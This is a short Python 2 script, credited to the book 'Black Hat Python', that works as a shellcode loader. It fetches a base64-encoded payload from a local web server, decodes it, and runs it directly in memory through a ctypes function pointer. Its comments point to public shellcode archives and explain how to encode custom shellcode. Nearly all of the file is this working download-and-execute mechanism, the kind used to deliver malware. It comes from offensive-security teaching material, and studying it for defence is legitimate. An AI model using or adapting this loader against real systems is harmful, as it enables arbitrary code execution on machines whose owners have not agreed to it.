# Code is from Black Hat Python
# https://www.nostarch.com/blackhatpython
# Some cool shellcode sources (It's awfully easy to find really good shellcode nowadays)
#   http://shell-storm.org/shellcode/
#   https://www.exploit-db.com/shellcode/
#   https://github.com/enaqx/awesome-pentest
# To create your own shellcode, take the compiled assembly instructions, then run the followin in linux:
# base64 -i <assembly-filename> > <output-filename>.bin

import urllib2
import ctypes
import base64

# NOTE: In a seperate terminal, start "python -m SimpleHTTPServer" in same directory as the example executable before running this
# retrieve the shellcode from our web server
url = "http://localhost:8000/pwned.bin"
response = urllib2.urlopen(url)

# decode the shellcode from base64
shellcode = base64.b64decode(response.read())

# create a buffer in memory
shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))

# create a function pointer to our shellcode
shellcode_func   = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))

# call our shellcode
# On my Windows 10 x64 system running EMET 5.51 set to maximum paranoia, I get this:
#   WindowsError: exception: access violation writing 0x03604050
# Your mileage may vary
shellcode_func()


